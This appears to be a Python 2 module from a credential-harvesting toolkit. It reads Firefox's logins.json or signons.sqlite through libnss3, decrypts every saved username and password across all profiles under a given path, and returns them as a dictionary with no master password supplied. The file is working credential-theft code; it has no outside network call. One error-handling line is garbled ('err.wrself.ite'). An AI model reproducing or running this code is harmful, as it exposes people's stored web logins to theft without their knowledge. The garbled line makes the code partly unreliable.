from sys import stderr as err
import sqlite3
import json
from base64 import b64decode
from os import path
from ctypes import c_uint, c_void_p, c_char_p, cast, byref, string_at
from ctypes import Structure, CDLL
import os

class NotFoundError(Exception):
    pass


class Item(Structure):
    _fields_ = [('type', c_uint), ('data', c_void_p), ('len', c_uint)]


class Credentials(object):
    def __init__(self, db):
        self.db = db

        if not path.isfile(db):
            raise NotFoundError("Error - {0} database not found\n".format(db))

        err.write("Info - Using {0} for credentials.\n".format(db))

    def __iter__(self):
        pass

    def done(self):
        pass


class SqliteCredentials(Credentials):
    def __init__(self, profile):
        db = profile + "/signons.sqlite"

        super(SqliteCredentials, self).__init__(db)

        self.conn = sqlite3.connect(db)
        self.c = self.conn.cursor()

    def __iter__(self):
        self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword "
                       "FROM moz_logins")
        for i in self.c:
            # yields hostname, encryptedUsername, encryptedPassword
            yield i

    def done(self):
        super(SqliteCredentials, self).done()

        self.c.close()
        self.conn.close()


class JsonCredentials(Credentials):
    def __init__(self, profile):
        db = profile + "/logins.json"
        super(JsonCredentials, self).__init__(db)

    def __iter__(self):
        with open(self.db) as fh:
            data = json.load(fh)

            try:
                logins = data["logins"]
            except:
                raise Exception("Unrecognized format in {0}".format(self.db))

            for i in logins:
                # yields hostname, encryptedUsername, encryptedPassword
                yield (i["hostname"], i["encryptedUsername"],
                       i["encryptedPassword"])

class GetFirefoxPasswords:
    def __init__(self):
        self.libnss = CDLL("libnss3.so")

    def getPasswords(self, profile, password=None):
        """
        Decrypt requested profile using the provided password and print out all
        stored passwords.
        """
        listpasswords = dict()
        if self.libnss.NSS_Init(profile) != 0:
            err.write("Error - Couldn't initialize NSS\n")
            return 5

        if password != None:
            password = c_char_p(password)
            keyslot = self.libnss.PK11_GetInternalKeySlot()
            print keyslot
            if keyslot is None:
                err.wrself.ite("Error - Failed to retrieve internal KeySlot\n")
                return 6

            if self.libnss.PK11_CheckUserPassword(keyslot, password) != 0:
                err.write("Error - Master password is not correct\n")
                return 7
        else:
            err.write("Warning - Attempting decryption with no Master Password\n")

        username = Item()
        passwd = Item()
        outuser = Item()
        outpass = Item()

        # Any password in this profile store at all?
        got_password = False

        try:
            credentials = JsonCredentials(profile)
        except NotFoundError:
            try:
                credentials = SqliteCredentials(profile)
            except NotFoundError:
                err.write("Error - Couldn't find credentials file "
                          "(logins.json or signons.sqlite).\n")
                return 4

        for host, user, passw in credentials:
            got_password = True
            username.data = cast(c_char_p(b64decode(user)), c_void_p)
            username.len = len(b64decode(user))
            passwd.data = cast(c_char_p(b64decode(passw)), c_void_p)
            passwd.len = len(b64decode(passw))

            if self.libnss.PK11SDR_Decrypt(byref(username), byref(outuser), None) == -1:
                err.write("Error - Passwords protected by a Master Password!\n")
                return 8

            if self.libnss.PK11SDR_Decrypt(byref(passwd), byref(outpass), None) == -1:
                # This shouldn't really happen but failsafe just in case
                err.write("Error - Given Master Password is not correct!\n")
                return 9

            listpasswords[format(host.encode("utf-8"))] = format(string_at(outuser.data,
                                                                           outuser.len)) + ":::" + format(
                string_at(outpass.data,
                          outpass.len))

        credentials.done()
        self.libnss.NSS_Shutdown()

        if not got_password:
            err.write("Warning - No passwords found in selected profile\n")

        return listpasswords

    def main(self, myPath):
        print "--", "Getting Firefox passwords"
        dic = {}
        lista = []
        myProfiles = myPath + "/firefox/"
        profiles = os.listdir(myProfiles)
        for profile in profiles:
            myProfilePath = myProfiles + profile
            dic[profile] = self.getPasswords(myProfilePath)


        return {"GetFirefoxPasswords" : dic}